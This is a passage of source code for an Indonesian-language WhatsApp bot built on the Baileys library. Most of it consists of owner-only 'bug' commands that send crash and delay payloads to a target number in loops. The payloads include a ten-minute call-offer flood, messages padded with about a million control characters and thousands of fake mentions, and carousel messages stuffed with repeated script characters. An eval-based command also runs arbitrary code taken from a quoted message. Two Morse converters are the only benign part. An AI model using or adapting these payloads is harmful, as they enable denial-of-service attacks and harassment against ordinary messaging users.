   gifPlayback: true, 
   caption:`
✘ 𝙻𝙰𝙽𝚉 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ TARGET : ${groupLink}
♛ STATUS : proses...
`
},{ quoted:m })

const key = sent.key


// ===== PROSES =====
await Putzz.sendMessage(m.chat,{
   video:{ url:"https://files.catbox.moe/k797ct.mp4" },
   gifPlayback: true, 
   edit:key,
   text:`
✘ 𝙻𝙰𝙽𝚉 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ TARGET : ${groupLink}
♛ PROSES : pengiriman pesan...
`
})

// ===== TEMPAT FUNCTION =====
for (let i = 0; i <= 50; i++) {
  //  await gsIntjavgb(Putzz, target, otaxkiw = true)
    await gsIntjavgb(Putzz, target, otaxkiw = true)
    await delay(1300)
}

// ===== FINISH =====
await Putzz.sendMessage(m.chat,{
   video:{ url:"https://files.catbox.moe/k797ct.mp4" },
   gifPlayback: true, 
   text:`
✘ 𝙻𝙰𝙽𝚉 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ TARGET : ${groupLink}
♛ TIME : ${new Date().toLocaleString()}
✔ SUCCESS
`
})
await reaksi("✅");
}
break  
case "testfunc": {

if (!isOwner) return ReplyLanz("[ #!. ] Only for owners")

// ===== wajib reply =====
if (!m.quoted)
   return ReplyLanz(
`[ $ ] Reply pesan yang berisi function JS

Contoh:
reply -> async function test(sock,target,m){...}
.testfunc 628xxxx,1`
   )

const q = text.trim()

if (!q)
   return ReplyLanz("⁉️ Format salah\n\nContoh:\n.testfunc 628xxxx,5")

let [rawTarget, rawLoop] = q.split(",")

const number = (rawTarget || "").replace(/[^0-9]/g, "")
if (!number) return ReplyLanz("[ $ ] Nomor target tidak valid")

const loop = Number(rawLoop) || 1
const target = number + "@s.whatsapp.net"

// ===== ambil kode function =====
const funcCode =
   m.quoted.text ||
   m.quoted.caption ||
   ""

if (!funcCode.includes("function"))
   return ReplyLanz("[ $ ] Pesan reply bukan function")

let fn

try {
   fn = eval(`(${funcCode})`)
} catch (e) {
   return ReplyLanz(`[ $ ] Parse error:\n${e.message}`)
}

// ===== context helper =====
const context = {
   sendMessage: async (jid, msg, opt={}) => {
      return Putzz.sendMessage(jid, msg, opt)
   }
}

await ReplyLanz(
`[ # ] TESFUNC EXECUTION

$ Target : ${number}
$ Loop   : ${loop}x`
)

// ===== EXEC LOOP =====
for (let i = 0; i < loop; i++) {

   try {
      await fn(Putzz, target, context)
   } catch (e) {
      console.log("[TESFUNC ERROR]", e)
   }
}

ReplyLanz("[ ! ] Done")

}
break

async function LanzFc(Putzz, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    let devices = (
        await Putzz.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await Putzz.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = Putzz.createParticipantNodes.bind(Putzz);
    let yntkts = Putzz.encodeWAMessage?.bind(Putzz);

    Putzz.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (Putzz.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = Putzz.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await Putzz.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 10 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        for (let i = 0; i < 10; i++) {
            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await Putzz.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: target,
                    id: Putzz.generateMessageTag(),
                    from: Putzz.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": Putzz.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },

                        { tag: "net", attrs: { medium: "3" } },

                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },

                        { tag: "encopt", attrs: { keygen: "2" } },

                        { tag: "destination", attrs: {}, content: destinations },

                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(Putzz.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            await Putzz.sendNode(lemiting);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        try { await Putzz.chatModify({ delete: true,
    lastMessages: [{
      key: {
        remoteJid: target,
        fromMe: true,
        id: Putzz.generateMessageTag()
      },
      messageTimestamp: Date.now() 
    }]
  },
  target
);
        } catch (error) {
            console.error("GAGAL:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
    console.log("BERHASIL");
}

async function LanzDelay(Putzz, target) {
  const real = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "LanzExecute??",
      contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\u0000",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\n".repeat(1045000),
                },
              },
            },
          },
        },
      },
    },
  }, {});
  const coyy = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "Lanz in here",
      contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\u0000",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\n".repeat(1045000),
                },
              },
            },
          },
        },
      },
    },
  }, {});
  const sync = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "LanzOffcial X Putzz", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        },
      },
    },
  },
  {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
  });
  await Putzz.relayMessage("status@broadcast", real.message, {
    messageId: real.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  await Putzz.sendMessage("status@broadcast", { delete: real.key });


  await Putzz.relayMessage("status@broadcast", coyy.message, {
    messageId: coyy.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  await Putzz.sendMessage("status@broadcast", { delete: coyy.key });
  await Putzz.relayMessage("status@broadcast", sync.message, {
    messageId: sync.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  await Putzz.sendMessage("status@broadcast", {
    delete: sync.key
  });
}
async function LanzSw(Putzz, target) {
var msg = generateWAMessageFromContent(target, {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
    "fileLength": "231536",
    "seconds": 88888888,
    "mediaKey": "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
    "caption": "x",
    "height": -99999,
    "width": 99999,
    "fileEncSha256": "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
    "directPath": "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1771576607",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "statusSourceType": "VIDEO",
      "remoteJid": " #xrellyspec ",
      "mentionedJid": Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
      "businessMessageForwardInfo": {
        "businessOwnerJid": "13135550202@s.whatsapp.net",
        "businessDescription": null
      },
      "featureEligibilities": {
        "canBeReshared": true
      },
      "isForwarded": true,
      "forwardingScore": 9999,
      "statusAttributions": [
        {
          "type": "MUSIC",
          "externalShare": {
            "actionUrl": "https://wa.me/settings/linked_devices#,,xrellyspec",
            "source": "INSTAGRAM",
            "duration": 999999999,
            "actionFallbackUrl": "https://wa.me/settings/linked_devices#,,xrellyspec"
          }
        }
      ]
    },
    "streamingSidecar": "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
    "thumbnailDirectPath": "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
    "thumbnailSha256": "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
    "thumbnailEncSha256": "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
    "annotations": [
      {
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMessage": {
            "stanzaId": "ACFC34B6742717BAC2BFE825254E1CD1",
            "message": {
              "extendedTextMessage": {
                "text": " xrelly6core # ",
                "previewType": "NONE",
                "inviteLinkGroupTypeV2": "DEFAULT"
              },
              "messageContextInfo": {
                "messageSecret": "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                "messageAssociation": {
                  "associationType": 18,
                  "parentMessageKey": {
                    "remoteJid": "status@broadcast",
                    "fromMe": false,
                    "id": "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                    "participant": "13135550202@s.whatsapp.net"
                  }
                }
              }
            }
          }
        },
        "embeddedAction": true
      }
    ],
    "externalShareFullVideoDurationInSeconds": 8
  }
}, {})

  let JsonExp2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " is back?! ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "🩸LanzExecute",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );

  await Putzz.relayMessage('status@broadcast', msg.message, {
    statusJidList: [target]
  });
  
  await Putzz.relayMessage('status@broadcast', JsonExp2.message, {
    statusJidList: [target]
  });
}

case "x-bug": 
case "x-barz":{
    if (!isOwner) return;
    if (!text) return ReplyLanz(example(`nomor target\n\nContoh:\n*${cmd}* 62xxx`));

    let targetRaw = text.trim();
    let target, huhuh;

    if (targetRaw.endsWith("@g.us")) {
        target = targetRaw;
        huhuh = target;
    } else {
        let bijipler = targetRaw.replace(/[^0-9]/g, "");
        if (bijipler.startsWith("0")) {
            return ReplyLanz("⚠️ Awalan nomor harus menggunakan kode negara (62), bukan 0");
        }
        target = bijipler + "@s.whatsapp.net";
        huhuh = bijipler;
    }

    const check = await Putzz.onWhatsApp(target);
    if (check.length < 1) return ReplyLanz("⚠️ Target tidak terdaftar di WhatsApp");
        await Putzz.sendMessage(m.chat, {
        footer: `Target👻\n             ╚➣*${text}*`,
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '📜 Pilih Menu' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝗟𝗜𝗦𝗧 𝗕𝗨𝗚',
                        sections: [
                            {
                                title: '# Silahkan Pilih List Bug Yang Tersedia',
                                highlight_label: `Lanz Is Here`,
                                rows: [
                                    { header: '☠️👿 𝐅𝐨𝐫𝐜𝐞𝐂𝐥𝐨𝐬𝐞 𝐍𝐨𝐂𝐥𝐢𝐜𝐤', title: 'Send Bug Force Close', description: 'Recommend', id: `${prefix}force-invis ${text}` },
                                    { header: '⚡🔥 𝐃𝐞𝐥𝐚𝐲 𝐂𝐨𝐦𝐛𝐨', title: 'Send Bug Delay invis V1-V2', description: 'Recommend', id: `${prefix}delay-combo ${text}` },
                                    { header: '👻👹 𝐃𝐞𝐥𝐚𝐲 𝐈𝐧𝐯𝐢𝐬 𝐕𝟏', title: 'Send Bug Delay Invis V1', description: 'Recommend', id: `${prefix}delay-invis ${text}` },
                                    { header: '💣💥 𝐃𝐞𝐥𝐚𝐲 𝐈𝐧𝐯𝐢𝐬 𝐕𝟐', title: 'Send Bug Delay Invis V2', description: 'Recommend', id: `${prefix}delay-force ${text}` }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true,
        document: cukurukuk,
        fileName: "Lanzexecute - V7",
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        caption: `Pilih Bug Yang sesuai`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
            businessMessageForwardInfo: {
                businessOwnerJid: global.owner + "@s.whatsapp.net"
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: `LanzExecute-V7`
            },
            externalAdReply: {
                title: `𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐨𝐭 𝟐𝟎𝟐𝟓`,
                body: `𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 ${namaOwner}`,
                thumbnailUrl: ppmenu,
                sourceUrl: linkGrup,
                mediaType: 1,
                renderLargerThumbnail: true,
            }
        }
    });
}
break;
case 'force-invis': {
     if (!isOwner) return ReplyLanz(mess.owner);
                if (!q) return ReplyLanz(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return ReplyLanz(`— ex: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                ReplyLanz(`success! sent bug to ${target}\n> ᴛᴇʀᴋᴀᴅᴀɴɢ ʜᴀʟ ᴋᴇᴄɪʟ ᴅᴀᴘᴀᴛ ᴍᴇɴʏᴇʙᴀʙᴋᴀɴ ʜᴀʟ ʙᴇsᴀʀ  `);
                
                for (let i = 0; i < 10; i++) {
                    await LanzFc(Putzz, target);
                    await sleep(1000);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
case 'delay-invis': {
     if (!isOwner) return ReplyLanz(mess.owner);
                if (!q) return ReplyLanz(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return ReplyLanz(`— ex: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                ReplyLanz(`success! sent bug to ${target}\n> ᴛᴇʀᴋᴀᴅᴀɴɢ ʜᴀʟ ᴋᴇᴄɪʟ ᴅᴀᴘᴀᴛ ᴍᴇɴʏᴇʙᴀʙᴋᴀɴ ʜᴀʟ ʙᴇsᴀʀ  `);
                
                for (let i = 0; i < 100; i++) {
                    await LanzDelay(Putzz, target);
                    await sleep(4000);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
case 'delay-force': {
     if (!isOwner) return ReplyLanz(mess.owner);
                if (!q) return ReplyLanz(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return ReplyLanz(`— ex: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                ReplyLanz(`success! sent bug to ${target}\n> ᴛᴇʀᴋᴀᴅᴀɴɢ ʜᴀʟ ᴋᴇᴄɪʟ ᴅᴀᴘᴀᴛ ᴍᴇɴʏᴇʙᴀʙᴋᴀɴ ʜᴀʟ ʙᴇsᴀʀ  `);
                
                for (let i = 0; i < 100; i++) {
                    await LanzSw(Putzz, target);
                    await sleep(4000);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
case 'delay-combo': {
     if (!isOwner) return ReplyLanz(mess.owner);
                if (!q) return ReplyLanz(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return ReplyLanz(`— ex: ${prefix + command} 62 !!`)
                
                let target = `${jidx}@s.whatsapp.net`;
                ReplyLanz(`success! sent bug to ${target}\n> ᴛᴇʀᴋᴀᴅᴀɴɢ ʜᴀʟ ᴋᴇᴄɪʟ ᴅᴀᴘᴀᴛ ᴍᴇɴʏᴇʙᴀʙᴋᴀɴ ʜᴀʟ ʙᴇsᴀʀ  `);
                
                for (let i = 0; i < 50; i++) {
                    await LanzDelay(Putzz, target);
                    await sleep(2000);
                    await LanzSw(Putzz, target);
                    await sleep(2000);
                }
                console.log(chalk.red.bold("Success!"))
            }
            break;
// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "tomorse": {
    try {
        let teks = text || (m.quoted && m.quoted.text) || "";
        if (!teks.trim()) return ReplyLanz(example("teksnya atau balas pesan berisi teks"));

        const morseDict = {
            'a': '•–', 'b': '–•••', 'c': '–•–•', 'd': '–••', 'e': '•',
            'f': '••–•', 'g': '––•', 'h': '••••', 'i': '••', 'j': '•–––',
            'k': '–•–', 'l': '•–••', 'm': '––', 'n': '–•', 'o': '–––',
            'p': '•––•', 'q': '––•–', 'r': '•–•', 's': '•••', 't': '–',
            'u': '••–', 'v': '•••–', 'w': '•––', 'x': '–••–', 'y': '–•––',
            'z': '––••', '1': '•––––', '2': '••–––', '3': '•••––', '4': '••••–',
            '5': '•••••', '6': '–••••', '7': '––•••', '8': '–––••', '9': '––––•',
            '0': '–––––', ' ': '/' 
        };

        let morse = teks.toLowerCase().split('').map(char => {
            return morseDict[char] || `?`; // '?' untuk karakter tidak dikenali
        }).join(' ');

        await ReplyLanz(`🔠 *Teks:* ${teks}\n📡 *Kode Morse:* ${morse}`);
        await ReplyLanz(morse);
    } catch (err) {
        console.error("Error pada perintah tomorse:", err);
        await ReplyLanz(`❌ Terjadi kesalahan saat mengonversi teks ke Morse. Silahkan coba lagi nanti!\n\n${err.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "demorse": {
    try {
        let morse = text || (m.quoted && m.quoted.text) || "";
        if (!morse.trim()) return ReplyLanz(`Masukkan kode Morse yang ingin dikonversi!\n\nContoh:\n*${cmd}* ••• •– –• –––`);

        const morseDict = {
            '•–': 'a', '–•••': 'b', '–•–•': 'c', '–••': 'd', '•': 'e',
            '••–•': 'f', '––•': 'g', '••••': 'h', '••': 'i', '•–––': 'j',
            '–•–': 'k', '•–••': 'l', '––': 'm', '–•': 'n', '–––': 'o',
            '•––•': 'p', '––•–': 'q', '•–•': 'r', '•••': 's', '–': 't',
            '••–': 'u', '•••–': 'v', '•––': 'w', '–••–': 'x', '–•––': 'y',
            '––••': 'z', '•––––': '1', '••–––': '2', '•••––': '3', '••••–': '4',
            '•••••': '5', '–••••': '6', '––•••': '7', '–––••': '8', '––––•': '9',
            '–––––': '0', '/': ' '
        };

        let morseWords = morse.split(/\/|\s/);
        let teks = morseWords.map(word => {
            return word.split(' ').map(char => morseDict[char] || '?').join('');
        }).join(' ');

        await ReplyLanz(`📝 *Hasil Konversi Morse ke Teks:*\n\n${teks}`);
    } catch (err) {
        console.error("Error pada perintah dmorse:", err);
        await ReplyLanz(`❌ Terjadi kesalahan saat mengonversi kode Morse ke teks. Silahkan coba lagi nanti!\n\n${err.message}`);
    }
}
break;

case 'tesfunc2':
            case 'invis-hard': {
            async function Delay(Putzz, target) {
    console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    for (let i = 0; i < 75; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "🩸𝐋𝐚𝐧𝐄𝐱𝐞𝐜𝐮𝐭𝐞" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "🩸𝐋𝐚𝐧𝐳𝐄𝐱𝐞𝐜𝐮𝐭𝐞" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "LanzOfficiall" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `§🩸𝐋𝐚𝐧𝐳𝐄𝐱𝐞𝐜𝐮𝐭𝐞§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[",
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
